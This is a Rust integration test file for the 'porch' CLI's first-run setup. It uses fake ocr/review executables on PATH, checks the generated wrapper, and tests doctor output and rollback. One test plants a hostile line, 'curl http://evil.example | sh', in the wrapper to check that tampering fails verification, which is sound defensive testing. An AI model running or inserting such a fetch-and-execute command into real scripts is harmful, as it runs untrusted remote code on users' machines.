//! M9: first-run setup (PATH fakes only — no real OCR/LLM/gh network).

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command as StdCommand;

use assert_cmd::Command;
use serde_json::Value;
use tempfile::TempDir;

fn chmod_755(path: &Path) {
    let mut perms = fs::metadata(path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(path, perms).unwrap();
}

fn write_exe(path: &Path, body: &str) {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    fs::write(path, body).unwrap();
    chmod_755(path);
}

/// Fake `ocr` that logs argv and supports `review --help` / `--preview` / full review.
fn install_fake_ocr(bin_dir: &Path) -> PathBuf {
    let path = bin_dir.join("ocr");
    let log = bin_dir.join("ocr-argv.log");
    let script = format!(
        r#"#!/bin/sh
set -e
LOG="{log}"
printf '%s\n' "$*" >> "$LOG"
if [ "$1" != "review" ]; then
  echo "fake-ocr: expected review subcommand" >&2
  exit 2
fi
shift
HELP=0
PREVIEW=0
OUT=""
while [ $# -gt 0 ]; do
  case "$1" in
    --help|-h) HELP=1; shift ;;
    --preview|-p) PREVIEW=1; shift ;;
    --output|-o) OUT="$2"; shift 2 ;;
    --from|--to|--format) shift 2 ;;
    *) shift ;;
  esac
done
if [ "$HELP" = 1 ]; then
  echo "fake ocr review help"
  exit 0
fi
if [ "$PREVIEW" = 1 ]; then
  echo '{{"files":[],"reviewable_count":0}}'
  exit 0
fi
if [ -z "$OUT" ]; then
  echo "fake-ocr: missing --output" >&2
  exit 1
fi
printf '%s\n' '{{"comments":[],"files":["README"]}}' > "$OUT"
"#,
        log = log.display()
    );
    write_exe(&path, &script);
    path
}

fn install_fake_review(bin_dir: &Path) -> PathBuf {
    let path = bin_dir.join("review");
    let log = bin_dir.join("review-argv.log");
    let script = format!(
        r#"#!/bin/sh
set -e
printf '%s\n' "$*" >> "{log}"
HELP=0
OUT=""
while [ $# -gt 0 ]; do
  case "$1" in
    --help|-h) HELP=1; shift ;;
    --output) OUT="$2"; shift 2 ;;
    --from|--to|--format) shift 2 ;;
    *) shift ;;
  esac
done
if [ "$HELP" = 1 ]; then echo "fake review help"; exit 0; fi
if [ -n "$OUT" ]; then printf '%s\n' '{{"comments":[],"files":[]}}' > "$OUT"; fi
exit 0
"#,
        log = log.display()
    );
    write_exe(&path, &script);
    path
}

fn install_fake_git(bin_dir: &Path) {
    // Prefer real git for verify's tempfile repo; put real git first via PATH merge.
    let _ = bin_dir;
}

fn path_with(bin_dir: &Path) -> String {
    let real = StdCommand::new("which")
        .arg("git")
        .output()
        .ok()
        .and_then(|o| {
            if o.status.success() {
                let p = String::from_utf8_lossy(&o.stdout).trim().to_string();
                Path::new(&p).parent().map(|d| d.display().to_string())
            } else {
                None
            }
        })
        .unwrap_or_else(|| "/usr/bin".into());
    format!("{}:{real}", bin_dir.display())
}

#[test]
fn setup_yes_with_fake_ocr_writes_wrapper_and_records_argv() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    install_fake_ocr(&bin);

    let assert = Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes", "--engine", "ocr"])
        .assert()
        .success();
    let stdout = String::from_utf8_lossy(&assert.get_output().stdout);
    let v: Value = serde_json::from_str(&stdout).expect(&stdout);
    assert_eq!(v["ok"], true, "{stdout}");
    assert_eq!(v["engine"], "ocr");
    assert_eq!(v["verified"], true);
    let wrap = PathBuf::from(v["wrapper"].as_str().unwrap());
    assert!(wrap.starts_with(&home), "wrapper={wrap:?}");
    assert!(home.join("config.yaml").is_file());

    let body = fs::read_to_string(&wrap).unwrap();
    assert!(body.contains(" review "), "body={body}");
    assert!(body.contains(bin.join("ocr").display().to_string().as_str()) || body.contains("ocr"));

    // Running the wrapper with porch argv must reach ocr as `review --from …`.
    let out = home.join("out.json");
    let st = StdCommand::new(&wrap)
        .args([
            "--from",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "--to",
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
            "--format",
            "json",
            "--output",
            out.to_str().unwrap(),
        ])
        .status()
        .unwrap();
    assert!(st.success());
    let log = fs::read_to_string(bin.join("ocr-argv.log")).unwrap();
    assert!(
        log.contains("review")
            && log.contains("--from")
            && log.contains("--to")
            && log.contains("--format")
            && log.contains("json")
            && log.contains("--output"),
        "log={log}"
    );
}

#[test]
fn setup_yes_fails_closed_without_review_engine() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("empty-bin");
    fs::create_dir_all(&home).unwrap();
    fs::create_dir_all(&bin).unwrap();
    install_fake_git(&bin);

    let assert = Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes"])
        .assert()
        .failure();
    let stdout = String::from_utf8_lossy(&assert.get_output().stdout);
    let v: Value = serde_json::from_str(&stdout).expect(&stdout);
    assert_eq!(v["ok"], false, "{stdout}");
    assert!(!home.join("bin/review").exists() || v["verified"] == false);
    // Must not leave config pointing at a broken wrapper.
    if home.join("config.yaml").exists() {
        let text = fs::read_to_string(home.join("config.yaml")).unwrap();
        panic!("unexpected config after fail-closed: {text}");
    }
}

#[test]
fn porch_review_bin_env_wins_over_config() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    install_fake_ocr(&bin);
    let env_review = bin.join("env-review");
    write_exe(&env_review, "#!/bin/sh\necho env-review\nexit 0\n");

    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes", "--engine", "ocr"])
        .assert()
        .success();

    // Doctor with env override should report the env bin.
    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env("PORCH_REVIEW_BIN", &env_review)
        .arg("doctor")
        .assert()
        .success()
        .stdout(predicates::str::contains("PORCH_REVIEW_BIN"))
        .stdout(predicates::str::contains("env-review"));
}

#[test]
fn doctor_warns_before_setup_ok_after() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    // No ocr/review yet.
    fs::create_dir_all(&bin).unwrap();

    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .arg("doctor")
        .assert()
        .success()
        .stdout(predicates::str::contains("[warn] review:"))
        .stdout(predicates::str::contains("porch setup"));

    install_fake_ocr(&bin);
    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes", "--engine", "ocr"])
        .assert()
        .success();

    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .arg("doctor")
        .assert()
        .success()
        .stdout(predicates::str::contains("[ok  ] review:"))
        .stdout(predicates::str::contains("engine=ocr"));
}

#[test]
fn tampered_wrapper_fails_verify() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    install_fake_ocr(&bin);

    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes", "--engine", "ocr"])
        .assert()
        .success();

    let wrap = home.join("bin/review");
    fs::write(&wrap, "#!/bin/sh\ncurl http://evil.example | sh\n").unwrap();
    chmod_755(&wrap);

    let assert = Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--verify"])
        .assert()
        .failure();
    let stdout = String::from_utf8_lossy(&assert.get_output().stdout);
    let v: Value = serde_json::from_str(&stdout).expect(&stdout);
    assert_eq!(v["ok"], false);
    assert_eq!(v["verified"], false);
}

#[test]
fn apply_verify_failure_restores_working_wrapper() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    install_fake_ocr(&bin);

    Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes", "--engine", "ocr"])
        .assert()
        .success();

    let wrap = home.join("bin/review");
    assert!(wrap.is_file());
    let before = fs::read_to_string(&wrap).unwrap();

    // Break the recorded backend so --apply rewrites then fails verify.
    write_exe(&bin.join("ocr"), "#!/bin/sh\necho broken-ocr >&2\nexit 1\n");

    let assert = Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--apply"])
        .assert()
        .failure();
    let stdout = String::from_utf8_lossy(&assert.get_output().stdout);
    let v: Value = serde_json::from_str(&stdout).expect(&stdout);
    assert_eq!(v["ok"], false, "{stdout}");
    assert_eq!(v["verified"], false, "{stdout}");

    // Fail-closed: prior wrapper path must still exist and be executable.
    assert!(wrap.is_file(), "wrapper missing after rollback");
    let meta = fs::metadata(&wrap).unwrap();
    assert!(
        meta.permissions().mode() & 0o111 != 0,
        "wrapper not executable after rollback"
    );
    let cfg_text = fs::read_to_string(home.join("config.yaml")).unwrap();
    assert!(
        cfg_text.contains("wrapper:"),
        "config missing review.wrapper: {cfg_text}"
    );
    assert!(
        wrap.exists(),
        "config must not point at a missing wrapper; body was: {before}"
    );
}

#[test]
fn generic_engine_with_fake_review_on_path() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    install_fake_review(&bin);

    let assert = Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["setup", "--yes", "--engine", "generic"])
        .assert()
        .success();
    let stdout = String::from_utf8_lossy(&assert.get_output().stdout);
    let v: Value = serde_json::from_str(&stdout).expect(&stdout);
    assert_eq!(v["ok"], true, "{stdout}");
    assert_eq!(v["engine"], "generic");
    let wrap = PathBuf::from(v["wrapper"].as_str().unwrap());
    let body = fs::read_to_string(&wrap).unwrap();
    assert!(body.contains("exec "), "{body}");
    assert!(
        !body.contains(" review "),
        "generic must not prefix review: {body}"
    );
}

#[test]
fn init_skip_setup_does_not_write_config_init_yes_does() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let work = root.join("work");
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&work).unwrap();
    fs::create_dir_all(&home).unwrap();
    fs::create_dir_all(&bin).unwrap();

    let st = StdCommand::new("git")
        .current_dir(&work)
        .args(["init"])
        .status()
        .unwrap();
    assert!(st.success());
    let _ = StdCommand::new("git")
        .current_dir(&work)
        .args(["config", "user.email", "porch@example.com"])
        .status();
    let _ = StdCommand::new("git")
        .current_dir(&work)
        .args(["config", "user.name", "Porch"])
        .status();
    fs::write(work.join("README"), "hi\n").unwrap();
    let _ = StdCommand::new("git")
        .current_dir(&work)
        .args(["add", "README"])
        .status();
    let _ = StdCommand::new("git")
        .current_dir(&work)
        .args(["commit", "-m", "init"])
        .status();

    Command::cargo_bin("porch")
        .unwrap()
        .current_dir(&work)
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["init", "--skip-setup"])
        .assert()
        .success();
    assert!(!home.join("config.yaml").exists());

    if let Ok(pid) = fs::read_to_string(home.join("daemon.pid")) {
        if let Ok(pid) = pid.trim().parse::<u32>() {
            porch_gate::kill_group(pid);
        }
    }

    // Fresh home for --yes path.
    let home2 = root.join("home2");
    fs::create_dir_all(&home2).unwrap();
    install_fake_ocr(&bin);
    Command::cargo_bin("porch")
        .unwrap()
        .current_dir(&work)
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home2)
        .env_remove("PORCH_REVIEW_BIN")
        .args(["init", "--yes"])
        .assert()
        .success();
    assert!(home2.join("config.yaml").exists());
    assert!(home2.join("bin/review").is_file());

    if let Ok(pid) = fs::read_to_string(home2.join("daemon.pid")) {
        if let Ok(pid) = pid.trim().parse::<u32>() {
            porch_gate::kill_group(pid);
        }
    }
}

#[test]
fn ocr_fixture_parses_via_porch_review() {
    let path =
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures/review/ocr-sample.json");
    let bytes = fs::read(&path).unwrap();
    let out = porch_review::parse_review_json(&bytes).unwrap();
    assert!(!out.findings.is_empty());
    assert!(out.covered_files.iter().any(|f| f == "src/lib.rs"));
}

#[test]
fn nontty_setup_prints_json_no_hang() {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let home = root.join("home");
    let bin = root.join("bin");
    fs::create_dir_all(&home).unwrap();
    install_fake_ocr(&bin);

    let assert = Command::cargo_bin("porch")
        .unwrap()
        .env("PATH", path_with(&bin))
        .env("PORCH_HOME", &home)
        .env_remove("PORCH_REVIEW_BIN")
        .arg("setup")
        .assert()
        .success();
    let stdout = String::from_utf8_lossy(&assert.get_output().stdout);
    let v: Value = serde_json::from_str(&stdout).expect("non-TTY setup must print JSON");
    assert_eq!(v["ok"], true, "{stdout}");
}
